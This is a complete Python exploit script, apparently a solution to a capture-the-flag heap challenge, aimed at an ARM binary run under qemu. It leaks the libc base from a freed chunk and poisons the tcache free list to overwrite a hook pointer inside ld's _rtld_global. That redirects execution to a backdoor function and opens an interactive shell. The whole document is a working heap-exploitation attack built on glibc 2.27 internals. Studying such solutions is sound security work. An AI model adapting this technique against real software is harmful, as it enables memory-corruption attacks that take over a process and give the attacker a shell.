from pwncli import * # type:ignore
import argparse

context.arch = 'arm'
context.binary = './hello'
context.log_level = 'debug'

debug = False

args = argparse.ArgumentParser(description='Exploit Script')
args.add_argument('--debug', action='store_true', help='Run in debug mode')

if args.parse_args().debug:
    debug = True

if debug:
    gift.io = process(['qemu-arm', '-g', '1234', '-L', '../lib', './hello'])
else:
    gift.io = process(['qemu-arm', '-L', '../lib', './hello'])

gift.elf = ELF('./hello')
gift.libc = ELF('../lib/lib/libc-2.27.so')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

def cmd(i):
    sla(b"Enter your choice:", i)

def add(idx, size):
    cmd('1')
    ru("Enter index and size:\n")
    sl(f"{idx} {size}")
    ru("Memory allocated.\n")

def dele(idx):
    cmd('2')
    ru("Enter index to free:\n")
    sl(f"{idx}")
    ru("Memory freed.\n")

def edit(idx, size, buf):
    cmd('3')
    ru("Enter index and size to edit:\n")
    sl(f"{idx} {size}")
    sl(buf)
    ru("Memory edited.\n")

def show(idx, size) -> bytes:
    cmd('4')
    ru("Enter index and size to show:\n")
    sl(f"{idx} {size}")
    data = r(size)
    ru("Memory shown.\n")
    return data

def rtld_global():
    def leak_lib() -> int:
        add(0, 0x300)
        add(1, 0xc)
        dele(0)
        main_arena = u32(show(0, 0x4)) - 0x34
        libc_base = main_arena - 0x1447e4
        return libc_base

    ld = ELF('../lib/lib/ld-2.27.so')
    libc.address = leak_lib()
    ld.address = libc.address - 0x32000
    success(f"libc.address = {hex(libc.address)}")
    success(f"ld.address = {hex(ld.address)}")
    rt_gl = ld.symbols['_rtld_global']
    success(f"_rtld_global = {hex(rt_gl)}")
    dl_hook = rt_gl + 0x7f0

    back_door = 0x400918
    add(0, 0xc)
    add(1, 0xc)
    add(2, 0xc)
    add(3, 0xc)
    dele(0)
    dele(1)
    dele(2)
    edit(1, 0x4, p32(dl_hook))
    add(3, 0xc)
    add(4, 0xc)
    add(5, 0xc)
    edit(5, 0x4, p32(back_door))
    cmd('5')
    sl("")
    sl("echo pwned")

if __name__ == '__main__':
    rtld_global()
    ia()